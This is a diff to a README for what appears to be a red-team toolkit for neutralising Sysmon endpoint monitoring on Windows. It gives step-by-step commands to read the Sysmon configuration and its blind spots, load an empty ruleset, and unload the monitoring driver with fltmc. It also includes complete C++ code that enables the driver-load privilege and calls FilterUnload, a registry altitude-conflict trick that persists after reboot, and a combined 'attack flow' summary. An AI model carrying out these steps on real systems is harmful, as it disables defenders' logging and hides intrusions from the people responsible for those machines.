@@ -1851,51 +1851,148 @@ This toolkit provides methods to neutralize Sysmon monitoring capabilities throu
 - Can manipulate services, drivers, and configurations
 - Sysmon is not hardened against "rogue admin" attacks
 
-### Step 2: Regular User Reconnaissance
+### Step 2: Administrative Techniques - Extract Current Configuration
 
-#### Hunt for Configuration Files
-Search for Sysmon XML configuration files that may have been left accessible:
+#### Method A: Using Sysmon Binary
+Locate and query the Sysmon binary directly:
+
 ```cmd
-dir C:\*.xml /s
-dir C:\Windows\*.xml /s
-dir C:\ProgramData\*.xml /s
+# Use the discovered Sysmon binary (often renamed from Sysmon.exe)
+onedrv.exe -c
 ```
 
-#### Parse Configuration Files
-Once found, analyze the XML rulesets to identify blind spots and exceptions. Refer to the white paper by Matt Graeber and Lee Christensen for detailed analysis techniques.
+<img width="1285" height="651" alt="image" src="https://github.com/user-attachments/assets/252a8fb8-bf82-4f5d-967e-d40317a460f5" />
 
-### Step 3: Administrative Techniques - Configuration Manipulation
+This command outputs comprehensive information including:
+- **Service name**
+- **Driver name** 
+- **Config file path** (e.g., `C:\RTO\Tools\swift.xml`)
+- Current rule sets and configuration status
 
-#### Extract Current Configuration
+#### Method B: Registry Query (Critical Step)
+**Extract configuration directly from the driver service registry key:**
+
+```cmd
+# Query the driver parameters for configuration and rules
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters"
+```
+
+**Expected Output:**
+```
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters
+    ConfigFile    REG_SZ    C:\RTO\Tools\swift.xml
+    Rules    REG_BINARY    [binary data]
+    SysmonImagePath    REG_SZ    C:\Windows\onedrv.exe
+```
+
+#### Extract Specific Values
+```cmd
+# Get just the configuration file path
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters" /v ConfigFile
+
+# Get the compiled rules binary data  
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters" /v Rules
+```
+
+**Key Points:**
+- **ConfigFile**: Shows the exact path to the active XML configuration (`C:\RTO\Tools\swift.xml`)
+- **Rules**: Contains the REG_BINARY compiled version of the current filtering rules
+- This registry key gives the same information as `onedrv.exe -c` but through direct registry access
+
+#### Method C: Service-Based Query
+You can also query the service parameters:
 ```cmd
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\onedrv\Parameters"
 ```
 
-This reveals:
-- Service configuration
-- Driver name
-- Path to configuration file
-- Current rulesets
+This may provide additional service-specific configuration details.
+
+### Step 3: Analyze the Configuration File
+
+#### Open and Examine the Configuration
+Using the path discovered from either method, open the configuration file:
+
+```cmd
+# Open with Notepad++ or preferred editor
+notepad++ C:\RTO\Tools\swift.xml
+```
+
+Or with native Windows editor:
+```cmd
+notepad C:\RTO\Tools\swift.xml
+```
+
+
+<img width="1612" height="797" alt="image" src="https://github.com/user-attachments/assets/7d255df8-88db-4d85-84aa-6ffef7868f88" />
+
+<img width="1611" height="805" alt="image" src="https://github.com/user-attachments/assets/ab3610f8-ec89-4460-bb7c-f40cf22f9e9c" />
+
+#### Configuration Analysis Points
+When examining the SwiftOnSecurity configuration or similar:
+
+**Look for monitoring gaps:**
+- Overly broad exclusion rules
+- Missing process creation events
+- Network connection exceptions
+- File extension exclusions
+- Path-based whitelists
+
+**Common blind spots to exploit:**
+- Default Windows directories
+- Temporary folder exclusions
+- Common administrative tool exceptions
+- Script interpreter exemptions
+
+### Step 4: Regular User Reconnaissance
+
+#### Hunt for Accessible Configuration Files
+If you don't have admin rights, search for accessible Sysmon configuration files:
+```cmd
+dir C:\*.xml /s
+dir C:\Windows\*.xml /s
+dir C:\ProgramData\*.xml /s
+dir C:\RTO\Tools\*.xml /s
+```
+
+#### Registry Analysis Without Admin Rights
+Some registry information may be readable by standard users:
+```cmd
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers" /s | findstr "Sysmon"
+```
+
+### Step 5: Configuration Manipulation
 
 #### Load Permissive Configuration
 Replace the current configuration with a permissive one that excludes all monitoring:
 ```cmd
-Sysmon.exe -c empty_config.xml
+# Load an empty or permissive configuration
+onedrv.exe -c empty_config.xml
 ```
 
-**Note:** This action itself will be logged if the current configuration monitors configuration changes.
+#### Create Permissive Configuration
+Create a configuration file that excludes most monitoring:
+```xml
+<Sysmon schemaversion="4.70">
+  <HashAlgorithms>SHA256</HashAlgorithms>
+  <EventFiltering>
+    <!-- Minimal or no rules to reduce logging -->
+    <RuleGroup groupRelation="or">
+      <!-- Add permissive rules here -->
+    </RuleGroup>
+  </EventFiltering>
+</Sysmon>
+```
 
-#### Analyze Rules Registry Value
-Examine the `Rules` value in the registry, which contains the current filtering rules that can be manipulated.
+**Note:** Configuration changes are logged if the current rules monitor configuration modifications.
 
-### Step 4: Driver Unloading (Immediate Effect)
+### Step 6: Driver Unloading (Immediate Effect)
 
 #### Manual Method using FLTMC
 ```cmd
 # List all minifilter drivers
 fltmc instances
 
-# Unload Sysmon driver
+# Unload Sysmon driver (using driver name from registry query)
 fltmc unload ofltdrv
 ```
 
@@ -1916,8 +2013,33 @@ The provided C++ code uses the Filter Management API to unload the Sysmon driver
 #pragma comment(lib, "Advapi32.lib")
 
 BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
-    // Privilege escalation code to enable SE_LOAD_DRIVER_NAME
-    // This is required for unloading filters
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
+        printf("OpenProcessToken() failed!\n");
+        return FALSE;
+    }
+
+    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
+        printf("LookupPrivilegeValue error: %u\n", GetLastError());
+        return FALSE;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    if (bEnablePrivilege)
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    else
+        tp.Privileges[0].Attributes = 0;
+
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
+        return FALSE;
+    }
+
+    return TRUE;
 }
 
 int main() {
@@ -1925,7 +2047,7 @@ int main() {
     if (!SetPrivilege(SE_LOAD_DRIVER_NAME, ENABLE))
         return -1;
     
-    // Unload the Sysmon driver
+    // Unload the Sysmon driver (using driver name from discovery)
     HRESULT hres = FilterUnload(L"ofltdrv");
     if (hres == S_OK)
         printf("Sysmon driver unloaded successfully\n");
@@ -1942,7 +2064,7 @@ int main() {
 - DNS events via ETW providers still get logged
 - Requires the SE_LOAD_DRIVER_NAME privilege
 
-### Step 5: Verify Unload Effectiveness
+### Step 7: Verify Unload Effectiveness
 
 #### Check Minifilter Status
 ```cmd
@@ -1957,7 +2079,7 @@ Event Viewer > Applications and Services Logs > Microsoft > Windows > Sysmon > O
 
 Look for error events indicating driver communication failures.
 
-### Step 6: Understand ETW Provider Persistence
+### Step 8: Understand ETW Provider Persistence
 
 Even after driver unloading, some events continue via ETW providers:
 
@@ -1973,7 +2095,7 @@ logman query providers "Microsoft-Windows-DNS-Client"
 
 The Sysmon service remains registered to the DNS client ETW provider, so DNS queries continue to be logged even after the minifilter is unloaded.
 
-### Step 7: Altitude Conflict Attack (Requires Reboot)
+### Step 9: Altitude Conflict Attack (Requires Reboot)
 
 #### Understanding Minifilter Altitudes
 - Altitudes determine driver position in the I/O processing stack
@@ -2000,7 +2122,7 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Instances\Sysmon Instanc
 - DNS events via ETW still work
 - Requires system reboot to take effect
 
-### Step 8: Compile and Execute
+### Step 10: Compile and Execute
 
 #### Building the Unload Tool
 ```cmd
@@ -2012,7 +2134,39 @@ cl implant.cpp
 implant.exe
 ```
 
+## Complete Attack Flow Example
+
+1. **Discovery**: 
+   - Run `reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters"` to extract:
+     - Config file path (`C:\RTO\Tools\swift.xml`)
+     - Driver name (`ofltdrv`)
+     - Service information
+
+2. **Analysis**: 
+   - Open `C:\RTO\Tools\swift.xml` in editor to understand monitoring rules
+   - Identify blind spots and exceptions in the configuration
+
+3. **Configuration Attack**: 
+   - Load permissive config with `onedrv.exe -c empty_rules.xml`
+
+4. **Kernel Attack**: 
+   - Unload driver with `implant.exe` or `fltmc unload ofltdrv`
+
+5. **Persistence Attack**: 
+   - Change altitude to cause permanent conflict after reboot
+
+6. **Verification**:
+   - Check `fltmc instances` for driver status
+   - Monitor Event Viewer for error logs
+
 ## Technical Details
+
+### Critical Information from Registry Query
+The command `reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters"` reveals:
+- **ConfigFile**: Full path to active XML configuration
+- **Rules**: REG_BINARY data of compiled filtering rules  
+- **SysmonImagePath**: Location of Sysmon binary
+- **Driver and service names** for manipulation
 
 ### Privilege Requirements
 
@@ -2055,5 +2209,4 @@ Each technique produces different artifacts:
 - Matt Graeber and Lee Christensen's white paper on Sysmon configuration analysis
 - SwiftOnSecurity Sysmon configuration for reference rulesets
 
-This toolkit provides multiple pathways to neutralize Sysmon monitoring, with the choice of technique depending on your operational requirements, time constraints, and acceptable risk of detection.
 </details>
